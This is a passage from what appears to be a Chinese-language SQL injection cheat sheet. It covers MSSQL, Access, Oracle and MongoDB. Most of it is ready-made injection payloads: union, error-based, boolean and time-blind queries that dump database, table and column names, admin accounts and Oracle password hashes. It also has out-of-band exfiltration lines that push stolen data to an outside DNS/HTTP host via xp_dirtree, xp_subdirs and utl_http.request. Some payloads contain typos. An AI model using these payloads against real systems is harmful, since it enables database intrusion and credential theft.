varchar(1024);</span><br><span class="line">set @a=(select top 1 name from master..sysobjects where xtype=char(85) and</span><br><span class="line">name not in (select top 1 name from master..sysobjects where</span><br><span class="line">xtype=char(85)));</span><br><span class="line">exec('master..xp_subdirs "//'%2B@a%2B'.z.xxx.ceye.io\\a" ');</span><br><span class="line"># 22库中的 DB_Admin 表有11条数据</span><br><span class="line">declare @a varchar(1024);</span><br><span class="line">set @a=(select count(*) from "22".dbo.syscolumns where id = object_id</span><br><span class="line">('DB_Admin'));</span><br><span class="line">exec('master..xp_subdirs "//'%2B@a%2B'.z.xxx.ceye.io\\a" ');</span><br><span class="line"># 爆DB_Admin字段</span><br><span class="line">http://127.0.0.1/info.aspx?id=1;</span><br><span class="line">declare @a varchar(1024);</span><br><span class="line">set @a=(SELECT top 1 "22".dbo.syscolumns.name FROM</span><br><span class="line">"22"..syscolumns,"22"..sysobjects where "22"..syscolumns.id =</span><br><span class="line">"22"..sysobjects.id AND "22"..sysobjects.name='DB_Admin' and</span><br><span class="line">"22"..syscolumns.name not in (SELECT top 3 "22"..syscolumns.name FROM</span><br><span class="line">"22"..syscolumns,"22"..sysobjects where "22"..syscolumns.id =</span><br><span class="line">"22".dbo.sysobjects.id AND "22"..sysobjects.name='DB_Admin'));</span><br><span class="line">exec('master..xp_subdirs "//'%2B@a%2B'.z.xxx.ceye.io\\a" ');</span><br><span class="line"># 数据 帐号 admin</span><br><span class="line">http://127.0.0.1/info.aspx?id=1;</span><br><span class="line">declare @a varchar(1024);</span><br><span class="line">set @a=(select top 1 UserName from DB_Admin where username not in (select top</span><br><span class="line">0 username from DB_Admin));</span><br><span class="line">exec('master..xp_subdirs "//'%2B@a%2B'.z.xxx.ceye.io\\a" ');</span><br><span class="line"># 数据 密码 123456</span><br><span class="line">declare @a varchar(1024);</span><br><span class="line">set @a=(select top 1 UserName from DB_Admin where username not in (select top</span><br><span class="line">0 username from DB_Admin));</span><br><span class="line">exec('master..xp_subdirs "//'%2B@a%2B'.z.xxx.ceye.io\\a" ');</span><br><span class="line">-----------------------------------------------------------------------------------------------------</span><br><span class="line">http://127.0.0.1/info.aspx?id=1;declare @a varchar(1024);</span><br><span class="line">set @a='\\'%2bmaster.dbo.fn_varbintohexstr(CONVERT( varbinary(max), (SELECT top 1 库名.dbo.syscolumns.name FROM 库名..syscolumns,库名..sysobjects where 库名..syscolumns.id = 库名..sysobjects.id AND 库名..sysobjects.name='表名' and 库名..syscolumns.name not in (SELECT top 0 库名..syscolumns.name FROM 库名..syscolumns,库名..sysobjects where 库名..syscolumns.id = 库名.dbo.sysobjects.id AND 库名..sysobjects.name='表名'))))%2b'.z.xxx.ceye.io';</span><br><span class="line">exec xp_dirtree @a;</span><br></pre></td></tr></tbody></table></figure>



<h2 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h2><h3 id="Access-联合查询"><a href="#Access-联合查询" class="headerlink" title="Access_联合查询"></a><strong>Access_联合查询</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># Access 只能单纯的注入拿数据,没有 information_schema 且没有库的概念, 一个文件就是一个数据库, 没有时间盲注和报错注入</span><br><span class="line"># 常用函数</span><br><span class="line">MID(str,start,length) 	# 可以用来提取母字符串中一部分特定的子字符串。</span><br><span class="line">ASC() 	# 可以返回参数中字符对应的ASCII值</span><br><span class="line">IIF(condition,true,false)</span><br><span class="line">top 1	# limit函数的替代</span><br><span class="line"># 判断数据库类型</span><br><span class="line"># 返回正常为Access数据库</span><br><span class="line">?id=1 and exists(select * from msysobjects)&gt;0</span><br><span class="line"># 返回正常位MySQL数据库</span><br><span class="line">?id=1 and exists(select * from sysobject)&gt;0</span><br><span class="line"># 使用 exists 采解表名和列名</span><br><span class="line"># 联合查询时, 结尾必须加上 from 表或列名</span><br><span class="line">?id=1 union 1,2, select 4,5,6 from 表或列名</span><br><span class="line"># 判断注入</span><br><span class="line">?id=1' 	# 出错</span><br><span class="line">?id=1" 	# 出错</span><br><span class="line">?id=1 	# 未出错</span><br><span class="line">?id=5-1 	# 未出错,注入类型为数字型</span><br><span class="line"># 猜表名, 把 from后面 * 加进变量, 使用 burp 跑</span><br><span class="line">?id=1 and exists(select count(*) from *)</span><br><span class="line"># 判断字段数和显示位</span><br><span class="line">?id=1 order by 5</span><br><span class="line">?id=1 union select 1,2,3,4,5 from user</span><br><span class="line"># 查数据</span><br><span class="line">?id=1 union select 1,username,password,4,5,6,7,8,9,10,11 from user</span><br><span class="line"># 查表和字段内容,数据类型要保持一致,所以ID无法查询,where后 top不能从0开始</span><br><span class="line">?id=1 union select top 1 1,username,password,4,5,6,7,8,9,10,11 from user where username not in (select top 1 username from user)</span><br></pre></td></tr></tbody></table></figure>

<h3 id="Access-布尔盲注"><a href="#Access-布尔盲注" class="headerlink" title="Access_布尔盲注"></a><strong>Access_布尔盲注</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 判断注入</span><br><span class="line">?id=1 and 1=1 或 and 1=0</span><br><span class="line"># 查看第 1 行,第 1 个字母</span><br><span class="line">?id=1 and (select top 1 asc(mid(username,1,1)) from user)&gt;97</span><br><span class="line"># 查看第 2 行,第 1 个字母</span><br><span class="line">?id=1 and (select top 1 asc(mid(username,1,1)) from user where id not in (select top 1 id from user))&gt;97</span><br></pre></td></tr></tbody></table></figure>

<h3 id="Access-偏移注入"><a href="#Access-偏移注入" class="headerlink" title="Access_偏移注入"></a><strong>Access_偏移注入</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">/**借用数据库的自连接查询让数据库内部发生乱序，从而偏移出所需要的字段在我们的页面上显示。</span><br><span class="line">成功与否看技巧与运气，不能保证100%成功，无需管理员账号密码字段，直接爆账号密码，很大程度上解决猜不到字段的问题。</span><br><span class="line">偏移注入的利用条件：</span><br><span class="line"></span><br><span class="line">已知管理表名</span><br><span class="line">已知任意字段（一个或多个会增加机率，最常见的就是id）</span><br><span class="line">成功率的因素</span><br><span class="line"></span><br><span class="line">管理表的字段数越少越好（最好是三个:id 账号字段 密码字段）</span><br><span class="line">当前注入点的脚本内查询的表内的字段数越多越好（最好有几十个，这样基本成功率是100%）</span><br><span class="line">已知的字段数越多越好（id一般存在**/</span><br><span class="line">#第一步:使用之前的方法得到显示点为2,3，字段个数为7，但是我们并不知道列名</span><br><span class="line">?id=1 union select 1,2,3,4,5,6,7 from user</span><br><span class="line">#第二步:用*依次向前替换数字字段，直到页面显示正常。例如在5替换为*后页面返回正常</span><br><span class="line">?id=1 union select 1,2,3,4,* from user</span><br><span class="line">#说明星号替换了3个字段(也就是表中有三个字段),后续要使用inner jion自表连接查询，因此计算字</span><br><span class="line">段数乘以2是否小于当前列(3*2&lt;7)</span><br><span class="line">#第三步:公式成立的话，用inner jion自连接查询</span><br><span class="line">?id=1 union select 1,* from (user as a inner join user as b on a.id=b.id)</span><br><span class="line">#如果是更多位，可再接inner join</span><br><span class="line">?id=1 union select 1,* from ((user as a inner join user as b on a.id=b.id) inner join user as c a.id=c.id)</span><br></pre></td></tr></tbody></table></figure>

<h2 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h2><h3 id="Oracle-基础操作"><a href="#Oracle-基础操作" class="headerlink" title="Oracle_基础操作"></a><strong>Oracle_基础操作</strong></h3><table>
<thead>
<tr>
<th align="center">类型</th>
<th align="center">含义</th>
<th align="center">存储描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Char()</td>
<td align="center">字串型</td>
<td align="center">最大长度2000, 不足时用空格补充</td>
</tr>
<tr>
<td align="center">Carchar2()</td>
<td align="center">字串型</td>
<td align="center">最大长度4000, 实际长度由存储数据长度绝定</td>
</tr>
<tr>
<td align="center">Number(x,y)</td>
<td align="center">数字型</td>
<td align="center">浮点型, 整型, 都可以存储, x 表示最大位数, y 表示小数位的最大位数</td>
</tr>
<tr>
<td align="center">Date</td>
<td align="center">日期(日-月-年)</td>
<td align="center">存储时间类型</td>
</tr>
<tr>
<td align="center">Clob</td>
<td align="center">字符数据</td>
<td align="center">存储较大的文本, 比如非结构话的XML文档, 最大位4G</td>
</tr>
<tr>
<td align="center">Blob</td>
<td align="center">二进制数据</td>
<td align="center">存储二进制对象,图像,音频,视频等</td>
</tr>
<tr>
<td align="center">long</td>
<td align="center">超上字符串</td>
<td align="center">存储较长字符串,最大长度为2G</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">数据库基本操作</th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="center">创建表</td>
<td align="left">creata table 表名(字段名 类型 约束)</td>
</tr>
<tr>
<td align="center"></td>
<td align="left">creata table test (name char(10) primary key.age tinyint)</td>
</tr>
<tr>
<td align="center">增加字段</td>
<td align="left">alter table 表名 add(字段名称, 数据类型)</td>
</tr>
<tr>
<td align="center"></td>
<td align="left">alter table test add(clss_name varchar2(200))</td>
</tr>
<tr>
<td align="center">删除一列</td>
<td align="left">alter table 表名 set unused column 列名</td>
</tr>
<tr>
<td align="center"></td>
<td align="left">alter table test set unused column class_name</td>
</tr>
<tr>
<td align="center">修改字段与类型</td>
<td align="left">alter table 表名 modify(字段名, 新字段类型)</td>
</tr>
<tr>
<td align="center"></td>
<td align="left">alter table test modify(name varchar(200))</td>
</tr>
<tr>
<td align="center">插入数据</td>
<td align="left">insert into 表名 values(所有字段对应的值);</td>
</tr>
<tr>
<td align="center"></td>
<td align="left">insert into test values(字段名1,字段名2) values(‘a’, 18)</td>
</tr>
<tr>
<td align="center">更新数据</td>
<td align="left">update 表名 set 字段名 = 值 where 更新条件</td>
</tr>
<tr>
<td align="center"></td>
<td align="left">update test set age = 20 where name = ‘a’</td>
</tr>
<tr>
<td align="center">删除数据</td>
<td align="left">delete 表名 where 条件</td>
</tr>
<tr>
<td align="center"></td>
<td align="left">delete test where name = ‘a’</td>
</tr>
<tr>
<td align="center">Truncate</td>
<td align="left">truncate table 表名        # 将表中数据一次性删除</td>
</tr>
<tr>
<td align="center"></td>
<td align="left">truncate删除速度快且不能恢复, delete删除数据可以在日志中恢复</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">数据库</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td align="center">dba_tables</td>
<td>系统里所有的表的信息,需要DBA权限才能查看</td>
</tr>
<tr>
<td align="center">all_tables</td>
<td>当前用户有权限的表的信息</td>
</tr>
<tr>
<td align="center">user_tables</td>
<td>当前用户名下的表的信息</td>
</tr>
<tr>
<td align="center"></td>
<td>dba_tables &gt;= all_tables &gt;= user_tables</td>
</tr>
<tr>
<td align="center">dba_all_tables</td>
<td>用户所拥有的或有访问权限的对象和表</td>
</tr>
<tr>
<td align="center">all_all_tables</td>
<td>某一个用户所拥有的或有访问权限的对象和表</td>
</tr>
<tr>
<td align="center">user_all_tables</td>
<td>某一个用户所拥有的对象和表</td>
</tr>
<tr>
<td align="center">utl_http.request</td>
<td>查看服务器出口 IP</td>
</tr>
<tr>
<td align="center">utl_inaddr.get_host_address</td>
<td>查看服务器监听 IP</td>
</tr>
<tr>
<td align="center">v$logfile</td>
<td>查看服务器操作系统</td>
</tr>
<tr>
<td align="center">dual</td>
<td>数据库的一个空表, 所有用户都可以使用</td>
</tr>
<tr>
<td align="center">like</td>
<td>模糊查询            # like ‘a%’</td>
</tr>
<tr>
<td align="center">||</td>
<td>连接字串符合    #</td>
</tr>
<tr>
<td align="center">rownum = 1</td>
<td>类似于MySql里面的 limit 1,1</td>
</tr>
<tr>
<td align="center">distinct</td>
<td>去重</td>
</tr>
<tr>
<td align="center">length</td>
<td>计算字串长度</td>
</tr>
<tr>
<td align="center">count</td>
<td>计算数量</td>
</tr>
<tr>
<td align="center">where exist</td>
<td>判断条件是否正常执行</td>
</tr>
<tr>
<td align="center">sys.all.tables</td>
<td>所有库表所在</td>
</tr>
<tr>
<td align="center">user_tab_colums</td>
<td>所有字段所在</td>
</tr>
<tr>
<td align="center">owner</td>
<td>库名字段</td>
</tr>
<tr>
<td align="center">table_name</td>
<td>表名字段</td>
</tr>
<tr>
<td align="center">查看服务器sid</td>
<td>select instance_name from v$instance</td>
</tr>
<tr>
<td align="center">当前连接用户</td>
<td>select sys_context (‘userenv’, ‘current_user’) from dual</td>
</tr>
<tr>
<td align="center">当前用户</td>
<td>select user from dual;</td>
</tr>
<tr>
<td align="center">列出所有用户</td>
<td>select username from  all_users order by username;</td>
</tr>
<tr>
<td align="center">列出数据库</td>
<td>select distinct owner from all_tables;</td>
</tr>
<tr>
<td align="center">列出表名</td>
<td>select table_name from all_tables;</td>
</tr>
<tr>
<td align="center">所有列</td>
<td>select column_name from all_tab_columns where table_name = ‘admin/表名’</td>
</tr>
<tr>
<td align="center">定位文件</td>
<td>select name from v$datafile;</td>
</tr>
<tr>
<td align="center"></td>
<td></td>
</tr>
<tr>
<td align="center"></td>
<td></td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># 列出密码哈希:</span><br><span class="line">SELECT name, password, astatus FROM sys.user$ — priv; &lt;= 10g(astatus能够在acct被锁定的状态下给你反馈) SELECT name,spare4 FROM sys.user$ — priv; 11g</span><br><span class="line"># 获取数据库所有用户:</span><br><span class="line">SELECT username FROM all_users ORDER BY username;</span><br><span class="line">SELECT name FROM sys.user$; -- priv;</span><br><span class="line"># 获取当前用户权限</span><br><span class="line">SELECT * FROM session_privs; </span><br><span class="line"># 获取所有用户权限</span><br><span class="line">SELECT * FROM dba_sys_privs -- priv;  </span><br><span class="line"># 获取用户角色</span><br><span class="line">SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;</span><br><span class="line">SELECT DISTINCT grantee FROM dba_sys_privs;</span><br><span class="line"># 获取所有数据库用户密码</span><br><span class="line">SELECT name, password, astatus FROM sys.user$; -- priv, &lt;= 10g;</span><br><span class="line">SELECT name, spare4 FROM sys.user$; -- priv, &gt;= 11g; </span><br><span class="line"># 列出DBA账户:</span><br><span class="line">SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’; — priv;</span><br><span class="line"># 获取主机名和IP</span><br><span class="line">SELECT UTL_INADDR.get_host_name FROM dual;</span><br><span class="line">SELECT host_name FROM v$instance;</span><br><span class="line">SELECT UTL_INADDR.get_host_address FROM dual;  查IP</span><br><span class="line">SELECT UTL_INADDR.get_host_name(‘127.0.0.1’) FROM dual;  查主机名称</span><br></pre></td></tr></tbody></table></figure>



<h3 id="Oracle-联合查询"><a href="#Oracle-联合查询" class="headerlink" title="Oracle_联合查询"></a><strong>Oracle_联合查询</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># 判断注入类型</span><br><span class="line">?id=1'"\ 或 and 1=0, and 1=1</span><br><span class="line"># 判断字段数</span><br><span class="line">?id=1 order by 4 </span><br><span class="line"># 判断显示位, 和MySQL不同, Oracle判断显示位时需要使用 null, 而且最后必须跟上 from dual </span><br><span class="line">?id=1 union select null, null, null, null from dual</span><br><span class="line"># 判断显示位类型</span><br><span class="line">?id=1 union select 1,'a',3,4 from dual</span><br><span class="line"># 查看当前数据库 实例 </span><br><span class="line">?id=1 union select 1, (select instance_name),3,4 from dual --</span><br><span class="line"># 查看数据库版本</span><br><span class="line">?id=1 union select 1,banner,3,4 from v$version where rownum = 1</span><br><span class="line"># 查看当前连接的用户</span><br><span class="line">?id=1 union select 1,user,3,4 from dual where rownum = 1</span><br><span class="line"># 查看所有数据库 limit = 1 数字变换, 查看下一个数据库名</span><br><span class="line">?id=1  union select 1,(select owner from (select owner.rownum as limit from (select distinct(owner) from sys.all_tables)) where limit = 1),3,4 from dual</span><br><span class="line"># 查看指定库表</span><br><span class="line">?id=1 union select 1,table_name,3,4 from (select table_name,rownum as limit from (select table_name from all_tables where owner = '库名')) where limit = 1</span><br><span class="line"># 查看字段</span><br><span class="line">?id=1 union select 1,column_name,3,4 from (select column_name,rownum as limit from (select column_name from all_tab_columns where table_name = '表名')) where limit = 1</span><br><span class="line"># 查看数据</span><br><span class="line">?id=1 union select 1,"字段1"||%27~%27||"字段2",3,4 from 库名.表名</span><br><span class="line"># 第二种写法 查看所有数据</span><br><span class="line">?id=1 union select 1,data,3,4 from (select</span><br><span class="line">data,rownum as limit from (select "字段1"||%27~%27||"字段2"||%27~%27||"字段3"||%27~%27||"字段4" as data from 库名.表名)) where limit = 1</span><br></pre></td></tr></tbody></table></figure>

<h3 id="Oracle-报错注入"><a href="#Oracle-报错注入" class="headerlink" title="Oracle_报错注入"></a><strong>Oracle_报错注入</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 一共有 7 个报错函数</span><br><span class="line"># 1. 查看当前连接的用户</span><br><span class="line">?id=1 and (select dbms_xdb_version.checkin(sys_context('userenv','current_user')) from dual) in not null</span><br><span class="line"># 2. 查看主机名</span><br><span class="line">?id=1 and utl_ianddr.get_host_name(sys_context('userenv', current_user)) = 1</span><br><span class="line"># 3.</span><br><span class="line">?id=1 and ctxsys.drithsx.sn(sys_context('userenv', 'current_user')) = 1</span><br><span class="line"># 4.</span><br><span class="line">?id=1 and ordsys.ord_dicom.getmappingxpath(sys_context('userenv', current_user)) = 1</span><br><span class="line"># 5.</span><br><span class="line">?id=1 and (select dbms_xdb_version.uncheckout(sys_context('userenv', current_user)) from dual) is not null</span><br><span class="line"># 6.</span><br><span class="line">?id=1 and (select dams_xdb_version.makeversioned(sys_context('userenv', 'current_user')) from dual) is not null</span><br><span class="line"># 7.</span><br><span class="line">?id=1 and (select dbms_utility.sqlid_to_sqlhash(sys_context('userenv', 'current_user')) from dual) is not null</span><br><span class="line"></span><br><span class="line"># 爆库</span><br><span class="line">?id=1 and (select dbms_xdb_version.checkin((select owner from (select owner,rownum as limit from (select distinct(owner) from all_table)) where limit = 1)) from dual) is not null</span><br><span class="line"># 爆表</span><br><span class="line">?id=1 and (select dbms_xdb_version.checkin((select owner from (select table_name,rownum as limit from (select table_name from all_tables where owner = '库名')) where limit = 1)) from dual) is not null</span><br><span class="line"># 爆字段</span><br><span class="line">?id=1 and (select dbms_xdb_version.checkin((select column_name, rownum as limit from (select column_name from all_tab_columns where table_name = '表名')) where limit = 1) from dual) is not null</span><br><span class="line"># 爆数据</span><br><span class="line">?id=1 and (select dbms_xdb_version.checkin((select data from (select datam rownum as limit from (select "字段1"||%27~%27||"字段2" as data from 库名.表名)) where limit = 1)) from dual) is not null</span><br></pre></td></tr></tbody></table></figure>

<h3 id="Oracle-布尔盲注"><a href="#Oracle-布尔盲注" class="headerlink" title="Oracle_布尔盲注"></a><strong>Oracle_布尔盲注</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 判断注入</span><br><span class="line">?id=1 and 0&gt;6 或 0&lt;6</span><br><span class="line"># 判断数据库数量</span><br><span class="line">?id=1 and (select count(distinct(owner)) from all_tables) = 10</span><br><span class="line"># 判断第 1 个 库的库名长度</span><br><span class="line">?id=1 and (select length(owner) from (select owner,rownum as limit from (select distinct(owner) from all_tables)) where limit = 1) = 5</span><br><span class="line"># 判断第 1 个 库的库名的第一个字母</span><br><span class="line">?id=1 and (select ascii(substr(owner,1,1)) from (select owner,rownum as limit from (select distinct(owner) from all_tables)) where limit = 1) = 100</span><br><span class="line"># 判断指定库中,表的数量</span><br><span class="line">?id=1 and (select count(table_name) from all_tables where owner = '库名') = 5</span><br><span class="line"># 判断指定库中, 第 1 个表的长度</span><br><span class="line">?id=1 and (select length(table_name) from (select table_name,rownum as limit from (select table_name from all_tables where owner = '库名')) where limit =1) = 4</span><br><span class="line"># 判断指定库中, 第 1 个表的第 1 个字母</span><br><span class="line">?id=1 and (select ascii(substr(table_name,1,1)) from (select table_name, rownum as limit from (select table_name from all_tables where owner = '库名')) where limit = 1) = 100</span><br></pre></td></tr></tbody></table></figure>

<h3 id="Oracle-时间盲注"><a href="#Oracle-时间盲注" class="headerlink" title="Oracle_时间盲注"></a><strong>Oracle_时间盲注</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 时间盲注的函数区别于其他数据库, 由 case when then else end 组成</span><br><span class="line"># 睡觉函数: dbms_pipe.receive_message(1,3)</span><br><span class="line"># 语法: (case when (payload) then dbms_pipe.receive_message(1,3) else 1 end)</span><br><span class="line"># 判断注入, 是否睡眠 3 秒</span><br><span class="line">?id=1 and 1=1 dbms_pipe.receive_message(1, 3)</span><br><span class="line"># 判断数据库数量</span><br><span class="line">?id=1 and (case when (select count(distinct(owner)) from all_tables) &gt; 10 then dbms_pipeive_message(1, 3) else 1 end) = 1</span><br><span class="line"># 判断第一个数据的库名长度</span><br><span class="line">?id=1 and (case when (select length(owner) from (select owner,rownum as limit from (select distinct(owner) from all_tables)) where limit = 1) = 5 then dbms_pipeive_message(1, 3)else 1 end) = 1</span><br><span class="line"># 判断第 1 个数据库名的第 1 个字母</span><br><span class="line">?id=1 and (case when (select ascii(substr(owner,1,1)) from (select owner,rownum as limit from (select distinct(owner) from all_tables)) where limit = 1)=84 then dbms_pipe.receive_message(1,3) else 1 end) = 1</span><br><span class="line"></span><br><span class="line"># 判断指定库中第 1 个表的长度</span><br><span class="line">?id=1 and (case when (select length(table_name) from (select table_name,rownum as limit from (select table_name from all_tables where owner = '库名')) where limit = 1) = 4 then</span><br><span class="line">dbms_pipe.receive_message(1, 3) else 1 end) = 1</span><br><span class="line"># 判断指定库中第 1 个表的第 1 个字母</span><br><span class="line">id=1 and (case when (select ascii(substr(table_name,1,1)) from (select table_name,rownum as limit from (select table_name from all_tables where owner = '库名')) where limit = 1 ) = 68 then dbms_pipe.receive_message(1, 3) else 1 end) = 1</span><br></pre></td></tr></tbody></table></figure>

<h3 id="Oracle-数据外带"><a href="#Oracle-数据外带" class="headerlink" title="Oracle_数据外带"></a><strong>Oracle_数据外带</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 相关函数</span><br><span class="line">utl_http.request() </span><br><span class="line">utl_inaddr.get_host_address()	</span><br><span class="line">sys.dbm_ldap.init() 	# 需要在自己电脑上开启http协议</span><br><span class="line"># 示例:</span><br><span class="line">?id=1 and (select utl_http.request('http://oracle.dns域名/data=||拼接payload') from dual) is not null</span><br><span class="line"># 示例:</span><br><span class="line">?id=1 and (select utl_http.request('http://oracle.dns域名/?data='||sys_context('userenv','currrent_user')) from dual ) in not null</span><br><span class="line">#</span><br><span class="line">?id=1 and (select utl_http.request((select 'http://oracle.dns域名/?data='||owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables))where limit = 1)) from dual</span><br><span class="line">#</span><br><span class="line">?id=1 and (select utl_http.request((select 'http://oracle.dns域名/?data='||data from (select data,rownum as limit from (select id||chr(126)||name||chr(126)|| sex as data from 库名.表名)) where limit = 1)) from dual</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>







<h2 id="NoSQL"><a href="#NoSQL" class="headerlink" title="NoSQL"></a>NoSQL</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"># Not Only SQL 泛指非关系型数据库</span><br><span class="line">​		redis	# key = value 方式存储</span><br><span class="line">​		mongodb	半nosql	半sql	# {'key: value', 'key: value'} join方式存储</span><br><span class="line">​		HBase</span><br><span class="line">​		apache Cassandra</span><br><span class="line"></span><br><span class="line"># key = value  以键值对的方式存储数据</span><br><span class="line"># img = {author: '', 'url': '', ......, type: img} 	查询数据的速度较快</span><br><span class="line"># mongodb 未授权, 不需要帐号密码直接登录的漏洞</span><br><span class="line"># 基本操作</span><br><span class="line"># 登录</span><br><span class="line">mongo --host 127.0.0.1</span><br><span class="line">show dbs 	# 查看所有数据库</span><br><span class="line">use	数据库名 	# 切换数据库, 数据库不存在会自动创建</span><br><span class="line">show collections 	# 查看集合</span><br><span class="line">db.dropDatabase()	# 进入数据库后,如果没有选择任何数据库,会删除默认的test数据库</span><br><span class="line"># 集合</span><br><span class="line">show collections 	# 查看集合</span><br><span class="line">db.creataCollection('xx') 	# 创建集合</span><br><span class="line">db.xxx.drop() 	# 删除集合</span><br><span class="line"># 文档操作</span><br><span class="line">da.xx.insert({key:value}) 	# 增加数据</span><br><span class="line">db.xx.remove({删除的条件}) 	# 条件为空,全部删除</span><br><span class="line">db.xx.remove({age:10}) 		# 删除所有符合条件的数据</span><br><span class="line">db.xx.remove({gender.true},{justOne.true}) 	# 只删除符合条件的第一个数据</span><br><span class="line">db.xx.update({查找的条件},{修改的内容}) 	# 更新数据</span><br><span class="line">db.xx.update({查找的条件},{$set{修改的内容}}) 	# 添加数据</span><br><span class="line"># 文档查询</span><br><span class="line">db.xx.find({查询条件}) 	# 为空,查询所有数据</span><br><span class="line">db.xx.find({age:10}) 	# 查询指定条件的所有内容</span><br><span class="line">db.xx.findOne({age:10}) 	# 查询指定条件的第一条</span><br><span 